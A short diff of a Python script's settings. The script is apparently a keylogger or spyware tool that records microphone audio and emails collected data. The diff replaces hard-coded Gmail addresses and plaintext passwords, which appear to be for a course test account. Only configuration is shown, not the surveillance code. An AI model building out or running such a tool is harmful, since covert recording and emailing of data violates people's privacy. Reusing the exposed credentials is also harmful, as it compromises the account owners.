@@ -1,5 +1,4 @@
 # Libraries
-
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -41,12 +40,12 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "anirbasrol88@gmail.com"
-password = "AnirbasRol2020"
+email_address = "csc491testemail@gmail.com"
+password = "CSC.491@00test3mai!"
 
 username = getpass.getuser()
 
-toaddr = "anirbasrol88@gmail.com"
+toaddr = "csc491testemail@gmail.com"
 
 key = " " # Generate an encryption key from the Cryptography folder
 
